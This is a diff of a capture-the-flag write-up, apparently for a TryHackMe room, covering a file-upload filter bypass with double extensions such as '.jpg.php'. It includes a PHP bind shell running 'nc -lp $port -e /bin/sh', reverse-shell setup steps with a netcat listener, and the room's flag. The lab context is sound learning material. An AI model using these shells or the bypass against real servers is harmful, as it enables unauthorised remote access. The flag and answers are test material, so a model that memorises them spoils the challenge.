@@ -18,11 +18,13 @@
 ---
 ### What type of file is accepted by the site?
 - **Answer:** image
-- **Steps to reproduce:** View source code. It will accept files with extension _.jpg, .jpeg, .png_ (which are image extensions).
+- **Steps to reproduce:** View source code. You can see that, it will accept files with following extensions:  `.jpg, .jpeg, .png` (which are image extensions).
 ---
 ### Bypass the filter and upload a reverse shell.
-- Reverse shell is used to obtain the flag.
-- 3 ways to obtain flag using PHP:
+- To bypass the file upload extension filter: `your-file.(jpg|jpeg|png).php`
+- The filter will check the extension after the first dot in the filename. This way, you can upload any file format. 
+
+- Reverse shell is used to obtain the flag. 3 ways to obtain flag using PHP:
 1. __Reverse Shell using the pre-written script__
     - Make a copy of the script: `/usr/share/webshells/php/php-reverse-shell.php` 
     - Replace `$ip` and `$port` in the script with your IP Address and the port on which your netcat is listening. 
@@ -38,14 +40,14 @@
     ```
     - **Note:** Replace `$ip` and `$port` with your IP Address and the port on which your netcat is listening.
 
-    > In the same way, **bind shell** can be established:
-    > ```php 
-    > <?php
-    > exec("nc -lp $port -e /bin/sh");
-    > ?>
-    > ```
-    > - But `nc` is not installed on the server. So, it is not possible in this case.
-    > - To connect to the bind shell, on the attack machine type the command: `nc $target_ip $port`.
+> In the same way, **bind shell** can be established:
+> ```php 
+> <?php
+> exec("nc -lp $port -e /bin/sh");
+> ?>
+> ```
+> - But `nc` is not installed on the server. So, it is not possible in this case.
+> - To connect to the bind shell, on the attack machine type the command: `nc $target_ip $port`.
 
 3. __Print the flag directly__
     - We know that the flag is in the file `/var/www/flag.txt`. So, we can use PHP to directly fetch and display the flag for us.
@@ -61,13 +63,11 @@
 
 ---
 ### Activate your reverse shell and catch it in a netcat listener!
-- To bypass the file upload extension filter: `your-file.(jpg|jpeg|png).php`
-- The filter will check the extension after the first dot in the filename. This way, you can upload any file format. 
+- To activate the reverse shell, go to the `/uploads/` directory and click on the file you uploaded.
 - To listen to the reverse shell:
     ```bash
     sudo nc -lvnp $port
     ``` 
-
 ---
 ### What is the flag in `/var/www/flag.txt`?
 -  **Answer:** THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}
